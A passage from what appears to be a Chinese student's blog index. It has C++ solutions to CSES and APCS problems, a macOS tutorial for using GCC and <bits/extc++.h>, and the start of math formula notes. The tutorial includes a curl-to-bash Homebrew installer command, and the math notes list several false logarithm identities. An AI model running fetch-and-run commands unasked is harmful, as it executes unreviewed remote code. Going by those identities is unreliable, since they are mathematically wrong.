tomax(a, b) (a) = max((a), (b))#define tomin(a, b) (a) = min((a), (b))#define all(a) a.begin(), a.end()#define rall(a) (a).rbegin(), (a).rend()#define pob pop_back#define pb push_back#define eb emplace_back#define ins insert#define err(a) cerr &lt;&lt; #a &lt;&lt; \": \" &lt;&lt; a &lt;&lt; \"\\n\"#define sp &lt;&lt; \" \" &lt;&lt;#define ios ios_base::sync_with_stdio(0), cin.tie(0), cout.tie(0)signed main() {    ios;    int n, sum = 0, tmp, ans=0;    cin &gt;&gt; n;    mii m;    m[0]=1;    rep(i, 1, n){        cin &gt;&gt; tmp;        sum += tmp;        ans += m[(sum%n+n)%n];        m[(sum%n+n)%n]++;    }cout &lt;&lt; ans &lt;&lt; '\\n';    return 0;}\nSubarray Distinct Values \nSubarray Distinct Values#include &lt;bits/stdc++.h&gt;using namespace std;/* TYPES  */#define int long long#define pii pair&lt;int, int&gt;#define F first#define S second#define vc vector#define vi vector&lt;int&gt;#define vii vector&lt;pii&gt;#define mii map&lt;int, int&gt;#define si set&lt;int&gt;/* UTILS */#define rep(i, a, b) for (int i = a; i &lt;= b; ++i)#define rev(i, a, b) for (int i = a; i &gt;= b; --i)#define tomax(a, b) (a) = max((a), (b))#define tomin(a, b) (a) = min((a), (b))#define all(a) a.begin(), a.end()#define rall(a) (a).rbegin(), (a).rend()#define pob pop_back#define pb push_back#define eb emplace_back#define ins insert#define err(a) cerr &lt;&lt; #a &lt;&lt; \": \" &lt;&lt; a &lt;&lt; \"\\n\"#define sp &lt;&lt; \" \" &lt;&lt;#define ios ios_base::sync_with_stdio(0), cin.tie(0), cout.tie(0)signed main() {    ios;    int n, k, ans = 0;    cin &gt;&gt; n &gt;&gt; k;    vi arr(n);    for(int &amp;i : arr) cin &gt;&gt; i;    int l = 0, r=1;    mii m;    m[arr[0]]++;    while(l&lt;=n){        while(r&lt;=n &amp;&amp; m.size()&lt;=k) m[arr[r++]]++;        ans+=r-1-l;        m[arr[l]]--;        if(m[arr[l]]==0) m.erase(arr[l]);        l++;    }cout &lt;&lt; ans &lt;&lt; '\\n';    return 0;}\nArray Division \nArray Division#include &lt;bits/stdc++.h&gt;using namespace std;/* TYPES  */#define int long long#define pii pair&lt;int, int&gt;#define F first#define S second#define vc vector#define vi vector&lt;int&gt;#define vii vector&lt;pii&gt;#define mii map&lt;int, int&gt;#define si set&lt;int&gt;/* UTILS */#define rep(i, a, b) for (int i = a; i &lt;= b; ++i)#define rev(i, a, b) for (int i = a; i &gt;= b; --i)#define tomax(a, b) (a) = max((a), (b))#define tomin(a, b) (a) = min((a), (b))#define all(a) a.begin(), a.end()#define rall(a) (a).rbegin(), (a).rend()#define pob pop_back#define pb push_back#define eb emplace_back#define ins insert#define err(a) cerr &lt;&lt; #a &lt;&lt; \": \" &lt;&lt; a &lt;&lt; \"\\n\"#define sp &lt;&lt; \" \" &lt;&lt;#define ios ios_base::sync_with_stdio(0), cin.tie(0), cout.tie(0)signed main() {    ios;    int n, k, r = 0, l = 0;    cin &gt;&gt; n &gt;&gt; k;    vi arr(n);    for(int &amp;i : arr) cin &gt;&gt; i, r+=i, tomax(l, i);    while(r&gt;l){        int mid = (r+l)/2;        int d = 1, sub_sum = 0;        for(int i : arr)            if(sub_sum+i &gt; mid) d++, sub_sum=i;            else sub_sum+=i;        if(d&lt;=k) r=mid;        else l=mid+1;    }cout &lt;&lt; r &lt;&lt; '\\n';    return 0;}\nSliding Window Median \nSliding Window Median#include &lt;bits/stdc++.h&gt;using namespace std;/* TYPES  */#define int long long#define pii pair&lt;int, int&gt;#define F first#define S second#define vc vector#define vi vector&lt;int&gt;#define vii vector&lt;pii&gt;#define mii map&lt;int, int&gt;#define si set&lt;int&gt;/* UTILS */#define rep(i, a, b) for (int i = a; i &lt;= b; ++i)#define rev(i, a, b) for (int i = a; i &gt;= b; --i)#define tomax(a, b) (a) = max((a), (b))#define tomin(a, b) (a) = min((a), (b))#define all(a) a.begin(), a.end()#define rall(a) (a).rbegin(), (a).rend()#define pob pop_back#define pb push_back#define eb emplace_back#define ins insert#define err(a) cerr &lt;&lt; #a &lt;&lt; \": \" &lt;&lt; a &lt;&lt; \"\\n\"#define sp &lt;&lt; \" \" &lt;&lt;#define ios ios_base::sync_with_stdio(0), cin.tie(0), cout.tie(0)signed main() {    ios;    int n, k, tmp;    cin &gt;&gt; n &gt;&gt; k;    vi arr;    vector&lt;set&lt;pii&gt;::iterator &gt; parr;    set&lt;pii&gt; sarr;    rep(i, 0, k - 1) cin &gt;&gt; tmp, parr.eb(sarr.insert({tmp, i}).F), arr.eb(tmp);    auto p = next(sarr.begin(), (k - 1) / 2);    cout &lt;&lt; p-&gt;F &lt;&lt; ' ';    rep(i, k, n-1) {        cin &gt;&gt; tmp;        parr.eb((sarr.insert({tmp,i})).F);        arr.eb(tmp);        if (arr[i - k] == p-&gt;F &amp;&amp; tmp &lt; p-&gt;F)            p = prev(p);        else if (arr[i - k] == p-&gt;F &amp;&amp; tmp &gt;= p-&gt;F)            p = next(p);        else if (arr[i - k] &gt; p-&gt;F &amp;&amp; tmp &lt; p-&gt;F)            p = prev(p);        else if (arr[i - k] &lt; p-&gt;F &amp;&amp; tmp &gt;= p-&gt;F)            p = next(p);        if(p==parr[i-k]) p=next(p);        sarr.erase(parr[i-k]);        cout &lt;&lt; p-&gt;F &lt;&lt; ' ';    }    return 0;}\nSliding Window Cost \nSliding Window Cost#include &lt;bits/stdc++.h&gt;using namespace std;/* TYPES  */#define int long long#define pii pair&lt;int, int&gt;#define F first#define S second#define vc vector#define vi vector&lt;int&gt;#define vii vector&lt;pii&gt;#define mii map&lt;int, int&gt;#define si set&lt;int&gt;/* UTILS */#define rep(i, a, b) for (int i = a; i &lt;= b; ++i)#define rev(i, a, b) for (int i = a; i &gt;= b; --i)#define tomax(a, b) (a) = max((a), (b))#define tomin(a, b) (a) = min((a), (b))#define all(a) a.begin(), a.end()#define rall(a) (a).rbegin(), (a).rend()#define pob pop_back#define pb push_back#define eb emplace_back#define ins insert#define err(a) cerr &lt;&lt; #a &lt;&lt; \": \" &lt;&lt; a &lt;&lt; \"\\n\"#define sp &lt;&lt; \" \" &lt;&lt;#define ios ios_base::sync_with_stdio(0), cin.tie(0), cout.tie(0)int n, k;vi arr;multiset&lt;int&gt; ms[3];int sum[3];void ins(int val) {    if (ms[0].empty()) {        ms[0].insert(val);        sum[1] += val;        return;    }    int a = *ms[0].rbegin();    if (a &lt; val) {        ms[1].insert(val);        sum[0] += val;        if (ms[1].size() &gt; k / 2) {            sum[1] += *ms[1].begin();            sum[0] -= *ms[1].begin();            ms[0].insert(*ms[1].begin());            ms[1].erase(ms[1].begin());        }    } else {        ms[0].insert(val);        sum[1] += val;        if (ms[0].size() &gt; (k + 1) / 2) {            sum[0] += *ms[0].rbegin();            sum[1] -= *ms[0].rbegin();            ms[1].insert(*ms[0].rbegin());            ms[0].erase(prev(ms[0].end()));        }    }}void del(int val) {    if (ms[1].empty()) {        ms[0].erase(ms[0].find(val)), sum[1] -= val;        return;    }    if (ms[1].find(val) != ms[1].end())        ms[1].erase(ms[1].find(val)), sum[0] -= val;    else        ms[0].erase(ms[0].find(val)), sum[1] -= val;    if (ms[0].empty()) {        sum[1] += *ms[1].begin();        sum[0] -= *ms[1].begin();        ms[0].insert(*ms[1].begin());        ms[1].erase(ms[1].begin());    }}signed main() {    // ios;    cin &gt;&gt; n &gt;&gt; k;    arr.resize(n);    for (int &amp;i : arr) cin &gt;&gt; i;    for (int i = 0; i &lt; k; i++) ins(arr[i]);    cout &lt;&lt; sum[0] - sum[1] + (k % 2 != 0) * (*ms[0].rbegin()) &lt;&lt; ' ';    for (int i = k; i &lt; n; i++) {        del(arr[i - k]);        ins(arr[i]);        cout &lt;&lt; sum[0] - sum[1] + (k % 2 != 0) * (*ms[0].rbegin()) &lt;&lt; ' ';    }    return 0;}\nMovie Festival II \nMovie Festival II#include &lt;bits/stdc++.h&gt;using namespace std;/* TYPES  */#define int long long#define pii pair&lt;int, int&gt;#define F first#define S second#define vc vector#define vi vector&lt;int&gt;#define vii vector&lt;pii&gt;#define mii map&lt;int, int&gt;#define si set&lt;int&gt;/* UTILS */#define rep(i, a, b) for (int i = a; i &lt;= b; ++i)#define rev(i, a, b) for (int i = a; i &gt;= b; --i)#define tomax(a, b) (a) = max((a), (b))#define tomin(a, b) (a) = min((a), (b))#define all(a) a.begin(), a.end()#define rall(a) (a).rbegin(), (a).rend()#define pob pop_back#define pb push_back#define eb emplace_back#define ins insert#define err(a) cerr &lt;&lt; #a &lt;&lt; \": \" &lt;&lt; a &lt;&lt; \"\\n\"#define sp &lt;&lt; \" \" &lt;&lt;#define ios ios_base::sync_with_stdio(0), cin.tie(0), cout.tie(0)signed main() {    ios;    int n, k, ans = 0;    cin &gt;&gt; n &gt;&gt; k;    vii arr(n);    multiset&lt;int&gt; ms;    for (pii &amp;i : arr) cin &gt;&gt; i.F &gt;&gt; i.S;    sort(all(arr), [](pii a, pii b) { return a.S &lt; b.S; });    rep(i, 1, k) ms.insert(-1);    rep(i, 0, n - 1) {        while (i &lt; n &amp;&amp; arr[i].F &lt; *ms.begin()) i++;        if (i == n) break;        ms.erase(prev(ms.upper_bound(arr[i].F)));        ms.insert(arr[i].S);        ans++;    }    cout &lt;&lt; ans &lt;&lt; '\\n';    return 0;}\nMaximum Subarray Sum II \nMaximum Subarray Sum II#include &lt;bits/stdc++.h&gt;using namespace std;/* TYPES  */#define int long long#define pii pair&lt;int, int&gt;#define F first#define S second#define vc vector#define vi vector&lt;int&gt;#define vii vector&lt;pii&gt;#define mii map&lt;int, int&gt;#define si set&lt;int&gt;/* UTILS */#define rep(i, a, b) for (int i = a; i &lt;= b; ++i)#define rev(i, a, b) for (int i = a; i &gt;= b; --i)#define tomax(a, b) (a) = max((a), (b))#define tomin(a, b) (a) = min((a), (b))#define all(a) a.begin(), a.end()#define rall(a) (a).rbegin(), (a).rend()#define pob pop_back#define pb push_back#define eb emplace_back#define ins insert#define err(a) cerr &lt;&lt; #a &lt;&lt; \": \" &lt;&lt; a &lt;&lt; \"\\n\"#define sp &lt;&lt; \" \" &lt;&lt;#define ios ios_base::sync_with_stdio(0), cin.tie(0), cout.tie(0)signed main() {    ios;    int n, a, b, tmp, ans = -1e18;    cin &gt;&gt; n &gt;&gt; a &gt;&gt; b;    vi pre(n + 1);    pre[0] = 0;    rep(i, 1, n) cin &gt;&gt; tmp, pre[i] = pre[i - 1] + tmp;    multiset&lt;int&gt; ms;    rep(i, a, n) {        if (i &gt; b) ms.erase(ms.find(pre[i - b - 1]));        ms.insert(pre[i-a]);        tomax(ans, pre[i] - *ms.begin());    }    cout &lt;&lt; ans &lt;&lt; '\\n';    return 0;}\n","categories":["程式題解","CSES"],"tags":["CSES"]},{"title":"MacOS 使用 &lt;bits / extc++.h & gt; 標頭檔 (以 VSCode 為例)","url":"/bits_extc++_on_macos/","content":"前言 \n先說結論，如果用 Clang 作為編譯器是難以使用&lt;bits/extc++.h&gt;標頭檔的，會產生各種神奇報錯，本文採取適用 Homebrew 安裝 GCC 的方式，並且使用 GCC 作為編譯器。\n\n\n本來在寫 CSES 想要用看看 pbds，啊結果發現完全沒辦法用，網路上到處找好像都沒什麼解決方法，研究一番之後就有了這篇文章。\n安裝 Homebrew (如果沒有的話) \n/bin/bash -c \"$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)\"\n安裝 GCC \n這邊可以選擇安裝不同版本的 GCC，但要注意 Arm 架構（M 系列晶片）的 Mac 只有支援 GCC\n11 以上的版本。\n# 安裝最新版本的GCCbrew install gcc# 安裝GCC 11brew install gcc@11\n使用 GCC 編譯器 \n如果不知道安裝的 GCC 版本，可以使用以下指令查看：\nls /usr/local/bin/gcc*  # Intel Macls /opt/homebrew/bin/gcc*  # Apple Silicon Mac\n確定了 GCC 的確切版本號（例如 gcc-11），可以使用該版本號的 GCC\n編譯您的程式碼。 例如，如果 GCC 版本是 11，則執行：\ng++-11 example.cpp -o Example# 如果你想使用特定版本的c++編譯（例如c++11），可以執行g++-11 example.cpp -o example -std=c++11\n在 VSCode 中使用 GCC \n使用 C/C++\nCompile Run 插件 \n進入到插件設定頁面，搜尋C-cpp-compile-run: Cpp-compiler，設定使用 gcc 編譯。\n\n使用 Competitive\nProgramming Helper (cph) 插件 \n進入到插件設定頁面，搜尋cph.language.cpp.Command，設定使用 gcc 編譯。\n\n結語 \n這樣就可以在 MacOS 上使用&lt;bits/extc++.h&gt;標頭檔了，可以試試底下這個程式碼能否正常運行：\n#include &lt;bits/extc++.h&gt;using namespace __gnu_pbds;using namespace std;int main() {    tree&lt;int, null_type, less&lt;int&gt;, rb_tree_tag, tree_order_statistics_node_update&gt; s;    s.insert(1);    s.insert(3);    cout &lt;&lt; *s.find_by_order(1) &lt;&lt; '\\n'; // 輸出第二個元素（3）    return 0;}\n如果對在 MacOS 上使用 GCC 和 &lt;bits / extc++.h&gt; 標頭檔有任何問題，歡迎在下方留言討論。\n","categories":["教學文"],"tags":["c++","MacOS","環境架設"]},{"title":"APCS 動線安排 (zerojudge g596)","url":"/zerojudge_g596/","content":"題目網址\n你是一個遊樂園展場的管理員，展場是一個 \\(m\\times\nn\\) 的矩形，可以使用木樁和線來排動線，你可以有兩種操作\n\n加入木樁 r c 0\n加一木樁在 , 並且向他的上下左右盡量找離最近的木樁連線, 題目保證 \\((r,c)\\) 上一定沒有木樁, 若 \\((r,c)\\)\n有線經過則先將那些線拆掉後再來連線\n\n移除木樁 r c 1\n\\((r,c)\\) 拔木樁, 並把他的線也拔掉,\n保證 \\((r,c)\\) 上一定有木樁\n\n總共有 \\(h\\)\n次操作，輸出過程中有線和有木樁佔據空間的面積最大是多少, 以及 \\(h\\) 次操作後有線和有木樁佔據空間的面積\n\n\n解題思路：\n狀態\n每個格子存在的 5 種狀況 (空的、木樁、直線、橫線、交線) 用五個數字表示：0、1、2、3、5 (交線用 5 是因為後面實作連線和拔線的時候，可以直接用加或減，讓一條線的狀態轉移到交線，或將交線的狀態轉移到一條線)\n算面積\n遍歷整張圖的每個格子，若該格子的狀態不為 0，則將面積加一 (因為最後要輸出過程中最大面積，因此我多開一個變數 \\(max\\_cnt\\) 紀錄)\n\n\n&lt;summary&gt;程式碼&lt;/summary&gt;&lt;!–code￼0–&gt;\n\n\n\n拔木樁\n先把該點木樁拔掉 (設為 0)，再往四個方向找線，如果有線就將跟目前前進方向相同的線拔掉 (假設目前是往上找，如果確認這個點是線，那就將那個點的狀態減 2，因此該點是直線會變 0 (空的)，交線則變 3 (橫線))\n\n\n&lt;summary&gt;程式碼&lt;/summary&gt;&lt;!–code￼1–&gt;\n\n\n\n建木樁\n先將指定點的狀態設為 1，接著往四個方向找木樁，如果確認有木樁就建線，建線的作法跟拔線相似 (假設目前是往上找，如果目前點的狀態是 2 (直線) 或 0 (空的) 那就設成 2，如果狀態是 3 (橫線) 就設成 5 (交線)，而如果狀態是 5 就不改變)\n\n\n&lt;summary&gt;程式碼&lt;/summary&gt;&lt;!–code￼2–&gt;\n\n\n\n主程式\n有前面那些函式後就簡單了，讀輸入然後呼叫建木樁或拔木樁，最後再輸出答案就完成了\n\n\n&lt;summary&gt;程式碼&lt;/summary&gt;&lt;!–code￼3–&gt;\n\n\n\n🌟\n要注意的是線有分成直向和橫向，直的被刪掉之後橫的不會被刪掉，若一個格子內同時存在直線和橫線，在刪掉其中一個的時候，另一個方向的線還要繼續存在，另外就是新的木樁放上去之後，不管原先那個格子上的線是什麼，會直接被刪掉，然後再由那個木樁往四個方向連線 (我就因為這樣修了兩次 bug🥲)\n\nAPCS 動線安排#include &lt;bits/stdc++.h&gt;using namespace std;#define rep(i, a, b) for (int i = a; i &lt;= b; ++i)#define tomax(a, b) (a) = max((a), (b))#define ios ios_base::sync_with_stdio(0), cin.tie(0), cout.tie(0)int g[103][103];int n, m, max_cnt = 0, h;int cnt() {    int c = 0;    rep(i, 0, n - 1) rep(j, 0, m - 1) c += (g[i][j] != 0);    tomax(max_cnt, c);    return c;}void rm(int x, int y) {    g[x][y] = 0;    int dir_x[] = {0, 1, 0, -1}, dir_y[] = {1, 0, -1, 0};    rep(d, 0, 3) {        int _x = x, _y = y;        while (g[_x += dir_x[d]][_y += dir_y[d]] == (2 + d % 2) || g[_x][_y] == 5)            g[_x][_y] -= (2 + d % 2);    }}void build(int x, int y) {    g[x][y] = 1;    int dir_x[] = {0, 1, 0, -1}, dir_y[] = {1, 0, -1, 0};    rep(d, 0, 3) {        int _x = x, _y = y;        bool ok = false;        while ((_x + dir_x[d]) &lt; n &amp;&amp; (_x + dir_x[d]) &gt;= 0 &amp;&amp;               (_y + dir_y[d]) &lt; m &amp;&amp; (_y + dir_y[d]) &gt;= 0)            if (g[_x += dir_x[d]][_y += dir_y[d]] == 1) ok = true;        if (!ok) continue;        _x = x, _y = y;        while (g[_x += dir_x[d]][_y += dir_y[d]] != 1)            if (g[_x][_y] == 2 + (d + 1) % 2)                g[_x][_y] = 5;            else if(g[_x][_y] != 5)                g[_x][_y] = (2 + d % 2);    }}signed main() {    ios;    cin &gt;&gt; n &gt;&gt; m &gt;&gt; h;    memset(g, 0, sizeof(g));    while (h--) {        int x, y, cmd;        cin &gt;&gt; x &gt;&gt; y &gt;&gt; cmd;        if (cmd)            rm(x, y);        else            build(x, y);        cnt();    }    cout &lt;&lt; max_cnt &lt;&lt; '\\n' &lt;&lt; cnt() &lt;&lt; '\\n';    return 0;}\n\n\n AC 的 Submission～\n\n","categories":["程式題解","APCS"],"tags":["APCS"]},{"title":"學測範圍數學公式證明","url":"/gsat_math_proof/","content":"前言 \n模考前臨時抱佛腳，常常公式要用到的時候才現場推，推完別人都寫完了，只好來整理一下，但我不喜歡背公式所以八成下次我還是會現場推…\n不過認真講，背公式感覺實在有點玷汙數學，而且大部分也都不用背隨便想想就有了，其他的就是知道有這個公式，了解推導的細節，盡量推得快一點，這樣要用到時就能馬上在腦內推出來，這樣就跟背的效果一樣啦 (●‘◡’●)\n要是有發現我寫錯的話拜託留言告訴我一下，或者你想幫我改，歡迎來 Pull\nRequest\n\n🔔建議使用電腦或平板觀看，才能獲得更好的閱讀體驗\n✨側邊欄有目錄，點擊即可跳轉╰(°▽°)╯\n&lt;summary&gt;要是用手機的話這邊也有目錄&lt;/summary&gt;&lt;ol type=\"1\"&gt;\n&lt;li&gt;&lt;a href=\"/gsat_math_proof/#前言\"&gt;前言&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=\"/gsat_math_proof/#實數\"&gt;實數&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=\"/gsat_math_proof/#絕對值\"&gt;絕對值&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=\"/gsat_math_proof/#指、對數\"&gt;指、對數&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=\"/gsat_math_proof/#點 %20&amp;%20 線 %20 (平面)\"&gt;點 &amp; 線\n(平面)&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=\"/gsat_math_proof/#圓\"&gt;圓&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=\"/gsat_math_proof/#多項式\"&gt;多項式&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=\"/gsat_math_proof/#數列與級數\"&gt;數列與級數&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=\"/gsat_math_proof/#計數原理\"&gt;計數原理&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=\"/gsat_math_proof/#排列\"&gt;排列&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=\"/gsat_math_proof/#組合\"&gt;組合&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a\nhref=\"/gsat_math_proof/#機率 %20 (古典機率、條件機率)&amp;%20 期望值\"&gt;機率\n(古典機率、條件機率)&amp; 期望值&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=\"/gsat_math_proof/#數據分析\"&gt;數據分析&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=\"/gsat_math_proof/#三角函數\"&gt;三角函數&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a\nhref=\"/gsat_math_proof/#向量 %20&amp;%20 行列式 %20&amp;%20 矩陣 %20 (線性代數)\"&gt;向量\n&amp; 行列式 &amp; 矩陣 (線性代數)&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=\"/gsat_math_proof/#空間\"&gt;空間&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=\"/gsat_math_proof/#參考文獻\"&gt;參考文獻&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=\"/gsat_math_proof/#心得\"&gt;心得&lt;/a&gt;&lt;/li&gt;\n&lt;/ol&gt;\n\n實數 \n根號相加 / 減比大小 \n這其實根本沒必要當成一個性質，但他實在太常出現了，就順便寫一下。通常這種題目是有好幾組兩個根號相加，然後根號內數字相加相同，通常是教說要開平方比大小，但其實可以從根號的下凹性質解決，假設題目是 \\(\\sqrt{3}+\\sqrt{5}\\)、\\(\\sqrt{2}+\\sqrt{6}\\)，那就是離中心點 \\(4\\) 遠的值會比較小\n\n另外還有一種考法是兩個根號相減，根號內差值相同，一樣用下凹的性質，斜率遞減，所以是比較小的那組會比較大，假設題目是 \\(\\sqrt{5}-\\sqrt{3}\\)、\\(\\sqrt{7}-\\sqrt{5}\\)，那就是 \\(\\sqrt{5}-\\sqrt{3}\\) 比較大\n絕對值 \n好像沒有🫠\n\n指、對數 \n\n\nImage\n\n\n指數不等式：\n\n\\(a^x&gt;a^y\\)，\\(x&gt;y\\)，\\(a&gt;1\\)\n\n\\(a^x&gt;a^y\\)，\\(x&lt;y\\)，\\(0&lt;a&lt;1\\)\n\n\\(a^x&lt;a^y\\)，\\(x&gt;y\\)，\\(0&lt;a&lt;1\\)\n\n\\(a^x&lt;a^y\\)，\\(x&lt;y\\)，\\(a&gt;1\\)\n\n對數不等式：\n\n\\(log_ax&gt;log_ay\\)，\\(x&gt;y\\)，\\(a&gt;1\\)\n\n\\(log_ax&gt;log_ay\\)，\\(x&lt;y\\)，\\(0&lt;a&lt;1\\)\n\n\\(log_ax&lt;log_ay\\)，\\(x&gt;y\\)，\\(0&lt;a&lt;1\\)\n\n\\(log_ax&lt;log_ay\\)，\\(x&lt;y\\)，\\(a&gt;1\\)\n\n對數性質：\n\n\\(log_a1=0\\)\n\n\\(log_aa=1\\)\n\n\\(log_ab=\\frac{1}{log_ba}\\)\n\n\\(log_ab=\\frac{log_cb}{log_ca}\\)\n\n\\(log_ab=log_ac*log_cb\\)\n\n\\(log_ab=log_ac+log_cb\\)\n\n\\(log_ab=log_ax*log_bx\\)\n\n\\(log_ab=\\frac{log_ax}{log_bx}\\)\n\n\\(log_ax^m=mlog_ax\\)\n\n\\(log_ab\\cdot log_bc\\cdot log_cd\\cdot\n...\\cdot log_nx\\) \\(=log_ax\\)\n\\(a^{log_bc}=c^{log_ba}\\)\n\n\n這應該不用證明吧，太簡單了😉\n點 &amp; 線 (平面) \n直線方程式 \n\n點斜式：\\(y-y_1=m(x-x_1)\\)\n截距式：\\(\\frac{x}{a} + \\frac{y}{b} =\n1\\) (\\(a\\)、\\(b\\) 為 \\(x\\)、\\(y\\) 軸截距)\n斜截式：\\(y=mx+b\\) (\\(m\\) 為斜率，\\(b\\) 為 \\(y\\) 軸截距)\n一般式：\\(Ax+By+C=0\\) (\\(A\\)、\\(B\\)、\\(C\\) 為實數)\n因為此直線斜率為 \\(\\frac{-A}{B}\\)，則法線斜率為 \\(\\frac{B}{A}\\)，則其法向量為 \\(\\vec{n}=(A,B)\\)\n\n參數式：\\(\\begin{cases} x=x_0+at \\\\\ny=y_0+bt \\end{cases}\\) (\\(x_0\\)、\\(y_0\\) 為直線上一點，\\(a\\)、\\(b\\) 為 \\(x\\)、\\(y\\) 方向向量)\n\n點到直線距離 \n使用時機：圓與直線交點數 (圓心到直線距離)\n\\(P(x_0,y_0), L:Ax+By+C=0\\)\n\\(d(P,L)=\\frac{|Ax_0+By_0+C|}{\\sqrt{A^2+B^2}}\\)\n證明：方法很多，不過我偏好用向量 (喔不，用內積會比較快，算了懶得改了)\n\\(\\vec{n} = (A,B)\\)\n使得存在 \\((x_1, y_1) = (x_0, y_0) +\nk\\vec{n}\\)\n滿足 \\(Ax_1+By_1+C=0\\)\n且其中 \\(|k\\vec{n}| = d(P,L)\\)\n又 \\(k =\n\\frac{Ax_0+B_y0+C}{A^2+B^2}\\)\n故\n\\[|k\\vec{n}| = |k||\\vec{n}| =\n\\frac{|Ax_0+By_0+C|}{\\sqrt{A^2+B^2}} = d(P, L)\\]\n角平分線 (點到直線距離類推) \n平面上有 \\(P(x_0,y_0),\\) \\(L_1:A_1x+B_1y+C_1=0,\\) \\(L_2:A_2x+B_2y+C_2=0\\)，其中 \\(P\\) 點在 \\(L_1\\)、\\(L_2\\) 的角平分線上，即 \\(P\\) 點到 \\(L_1\\)、\\(L_2\\) 的距離相等，則 \\(d(P,L_1)=d(P,L_2)\\)\n故 \\(\\frac{|A_1x_0+B_1y_0+C_1|}{\\sqrt{A_1^2+B_1^2}}=\\frac{|A_2x_0+B_2y_0+C_2|}{\\sqrt{A_2^2+B_2^2}}\\)\n則 \\(\\frac{A_1x_0+B_1y_0+C_1}{\\sqrt{A_1^2+B_1^2}}=\\pm\\frac{A_2x_0+B_2y_0+C_2}{\\sqrt{A_2^2+B_2^2}}\\)\n則 \\(P\\) 點所在直線為：\\(\\frac{A_1x+B_1y+C_1}{\\sqrt{A_1^2+B_1^2}}=\\pm\\frac{A_2x+B_2y+C_2}{\\sqrt{A_2^2+B_2^2}}\\)\n另解：利用直線系，確定兩條直線方向向量一樣長，然後直接相加，若兩方向向量夾角為銳角則相加為銳角角平分線，相減則為鈍角，反之則相加為鈍角相減為銳角，例子如下圖：\n\n兩直線夾角 \n平面上有 \\(L_1:A_1x+B_1y+C_1=0,\\)\n\\(L_2:A_2x+B_2y+C_2=0\\)，兩直線夾角為 \\(\\theta\\)，其中 \\(0\\leq\\theta\\leq\\pi\\)\n\n用內積：\\(\\cos\\theta=\\pm\\frac{A_1A_2+B_1B_2}{\\sqrt{A_1^2+B_1^2}\\sqrt{A_2^2+B_2^2}}\\)\n兩直線法向量分別為 \\(\\vec{n_1}=(A_1,B_1)\\)、\\(\\vec{n_2}=(A_2,B_2)\\)，則 \\(\\cos\\theta=\\frac{\\vec{n_1}\\cdot\\vec{n_2}}{|\\vec{n_1}||\\vec{n_2}|}\\)，另一角為 \\(\\pi-\\theta\\)\n用差角公式：\\(\\tan\\theta=\\pm\\frac{m_1-m_2}{1+m_1m_2}=\\pm\\frac{A_1B_2-A_2B_1}{A_1A_2+B_1B_2}\\)\n兩直線斜率分別為 \\(m_1=\\frac{-A_1}{B_1}\\)、\\(m_2=\\frac{-A_2}{B_2}\\)，則 \\(\\tan\\theta=\\frac{m_1-m_2}{1+m_1m_2}\\)，另一角為 \\(\\pi-\\theta\\)\n\n圓 \n圓方程式 \n\n標準式：\\(x^2+y^2=r^2\\) (\\(r\\) 為半徑)\n一般式：\\((x-a)^2+(y-b)^2=r^2\\)\n(\\(a\\)、\\(b\\) 為圓心，\\(r\\) 為半徑)\n阿波羅圓：平面上給定 \\(A、B\\) 兩點，若動點 \\(P\\) 滿足 \\(\\overline{PA}=k\\overline{PB}\\)(\\(k\\) 不為 \\(1\\) 或 \\(0\\))，則 \\(P\\) 點軌跡為一圓，但這欣賞就好應該是不會考\n\n\n\n阿波羅圓\n\n圓系 \n簡單來說就是兩個圓方程式相加 (或是可以各乘上某個數字後相加) 就會得到一個新的圓 (根據圓方程式所乘上的數字會有無限多種)，並且會穿過原先兩圓的交點 (如果原先有交點的話)，同樣的如果是一個圓跟一條線就會是會穿過原先線與圓交點的新圓 (一樣如果原先有焦點的話)。特別的當兩圓相減使得 \\(x^2\\)、\\(y^2\\) 係數為零時，會得到一條直線，也就是所謂根軸，這條直線就會是穿過原先兩圓的交點的直線。\n舉例來說，如果有兩個圓\n\\(C_1:x^2+y^2+d_1x+e_1y+f_1=0,\\)\n\\(C_2:x^2+y^2+d_2x+e_2y+f_2=0\\)\n則 \\(aC_1+bC_2=0,\\) 其中 \\(a,b\\in\\mathbb{R}\\) 代表過兩圓焦點之新圓，其圓方程式為\n\\[(a+b)x^2+(a+b)y^2+(ad_1+bd_2)x+(ae_1+be_2)y+(af_1+bf_2)=0\\]\n顯而易見地，當有一 \\((x,y)\\) 使得\n\\(C_1:x^2+y^2+d_1x+e_1y+f_1=0,\\)\n\\(C_2:x^2+y^2+d_2x+e_2y+f_2=0\\)\n則此 \\((x,y)\\) 也會使得 \\(aC_1+bC_2=0\\)，故 \\(aC_1+bC_2=0\\) 會穿過原先兩圓的交點。\n當 \\(a+b=0\\) 時，\\(x^2\\)、\\(y^2\\) 係數為零，\\(aC_1+bC_2=0\\) 為一直線，即為根軸，其直線方程式為\n\\[(d_1-d_2)x+(e_1-e_2)y+(f_1-f_2)=0\\]\n多項式 \n餘式定理 \n\\(f(x)\\) 為一多項式，\\(a, b \\in \\mathbb{R}\\)，則 \\(f(x)\\) 除以 \\((ax-b)\\) 的餘式為 \\(f(\\frac{b}{a})\\)，即\n\\(f(x)=(ax-b)q(x)+f(\\frac{b}{a})\\)\n因式定理 \n\\(a_1, a_2, ...,\na_n\\) 為相異實數且 \\(f(a_1)=f(a_2)=...=f(a_n)=0\\)\n\\(\\iff\\) \\((x-a_1)(x-a_2)...(x-a_n)|f(x)\\)\n牛頓差值多項式 \n給定 